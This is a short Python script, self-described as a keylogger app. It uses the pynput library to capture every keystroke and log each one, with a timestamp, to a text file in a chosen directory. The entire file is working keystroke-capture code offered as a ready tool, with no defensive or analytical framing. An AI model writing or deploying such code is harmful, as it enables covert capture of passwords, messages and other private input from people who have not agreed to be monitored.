#this is a keylogger app
import pynput
from pynput.keyboard import Key, Listener
import logging
log_dir = r"C:/"   #choose here a path to log directory
logging.basicConfig(filename=(log_dir + r"/keylog.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(Key):
    logging.info(str(Key))

with Listener(on_press=on_press) as listener:
    listener.join()

